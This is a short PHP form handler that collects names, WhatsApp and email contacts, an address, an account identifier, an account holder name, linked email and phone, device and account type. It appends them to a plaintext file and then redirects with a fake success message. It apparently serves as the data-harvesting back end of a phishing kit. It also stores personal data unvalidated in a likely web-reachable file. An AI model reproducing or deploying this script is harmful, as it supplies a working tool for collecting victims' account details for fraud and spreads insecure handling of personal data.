<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $filename = 'w/admin/database/data3.txt';
    $data = file_exists($filename) ? file_get_contents($filename) : '';

    // Capture form data
    $firstname = trim($_POST['firstname']);
    $lastname = trim($_POST['lastname']);
    $whatsapp = trim($_POST['whatsapp']);
    $email = trim($_POST['email']);
    $address = trim($_POST['address']);
    $account = trim($_POST['account']);
    $account_holder_name = trim($_POST['account_holder_name']);
    $connected_email = trim($_POST['connected_email']);
    $connected_number = trim($_POST['connected_number']);
    $device = trim($_POST['device']);
    $account_type = trim($_POST['account_type']);

    $new_entry = "$firstname|$lastname|$whatsapp|$email|$address|$account|$account_holder_name|$connected_email|$connected_number|$device|$account_type";

    // Append data to file
    file_put_contents($filename, $new_entry . PHP_EOL, FILE_APPEND);

    // Redirect to done2.html
    echo '<script>alert("Your request has been submitted successfully!"); window.location.href = "done2.html";</script>';
    exit;
}
?>